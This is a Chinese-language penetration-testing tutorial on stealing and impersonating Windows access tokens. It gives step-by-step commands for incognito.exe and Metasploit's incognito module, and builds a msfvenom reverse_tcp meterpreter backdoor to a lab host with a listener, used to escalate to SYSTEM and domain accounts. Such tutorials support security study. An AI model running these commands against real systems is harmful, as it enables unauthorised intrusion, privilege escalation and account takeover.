# 内网安全——Token的窃取与利用

## 令牌

1. 令牌是系统的临时密钥，相当于账号和密码，用来决定是否允许这次请求和判断是隶属于哪一用户的，它允许你在不提供密码和其他凭证的前提下，访问网络和系统资源这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点是随机性，不可预测，黑客或软件无法猜测出令牌
2. 假冒令牌可以假冒网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员操作权限的时候，需要通过假冒域管理员的令牌进行攻击
3. 令牌种类
   - 访问令牌：表示访问控制操作主体的系统对象
   - 会话令牌：是交互会话中唯一的身份标识符
   - 密保令牌：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，如U盾

4. windows的AccessToken有两种类型
   - Delegation Token：授权令牌，它支持交互式会话登录
   - Impresonation Token：模拟令牌，它是非交互的会话
   - 注意，两种token只在系统重启后清除，具有Delegation Token的用户在注销后，该Token将变成Impresonation Token，依旧有效

## AccessToken的窃取与利用

1. AccessToken的窃取与利用需要administrator管理员权限，也就是需要提权
2. AccessToken窃取方法
   - incognito.exe程序
   - InvokeTokenManipulat.ps1脚本
   - MSF的incognito模块

3. [incognito](https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip)

   - AccessToken列举

     ``` powershell
     incognito.exelist_tokens-u
     ```

   - 操作：模拟其他用户的令牌（复制token）如果要使用AccessToken模拟其他用户，可以使用命令

     ``` powershell
     incognito.exe execute -c "完整的Token名" cmd.exe
     ```

     例如：模拟system权限用户（提权至system）

     ``` powershell
     incognito.exe execute -c "NTAUTHORITY\SYSTEM" cmd.exe 
     ```

     降权至当前用户

     ``` powershell
     incognito.exe execute -c "当前用户token" cmd.exe
     ```

     获取域普通用户

     ``` powershell
     incognito.exe execute -c "moonsec\test" cmd.exe
     ```

4. MSF的incognito模块

   ``` powershell
   use incognito #加载 incognito
   list_tokens -u #列出 AccessToken
   getuid #查看当前 token
   impersonate_token "NT AUTHORITY\SYSTEM" #模拟 system 用户，getsystem 命令即实现了该命令。如果要模拟其他用户，将 token 名改为其他用户即可
   steal_token 1252 #从进程窃取 token
   getsystem #提升至 system 权限
   rev2self #返回到之前的 AccessToken 权限
   ```

## MSF令牌实战

1. msf 生成后门

   ``` powershell
   msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.168.0.115 -f exe -o msf.exe
   ```

2. 监听端口

   ``` powershell
   msfconsole
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set lhost 192.168.0.115
   set lport 6666
   exploit
   use incognito #进入 incognito 模块
   list_tokens -u 
   ```

3. 列出两种令牌
   - Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问) 
   - Impresonation Token：模拟令牌，它是非交互的会话。

4. 伪造令牌

   ``` powershell
   impersonate_token 12SERVER-01\Administrator  #假冒 12server-01\adminstrator 的令牌
   impersonate_token moonsec\\test #假冒 moonsec\test的令牌
   impersonate_token "NT AUTHORITY\SYSTEM" #假冒 System 的令牌
   ```

5. 除了可以伪造令牌 也可以从进程里窃取令牌 首先使用 `ps `命令列出进程 查看进程用户使用 `steal_token pid `窃取令牌就有对应的权限。

6. 从进程窃取令牌

   ``` powershell
   steal_token PID
   ```

7. 返回之前的 token

   ``` powershell
   rev2self
   ```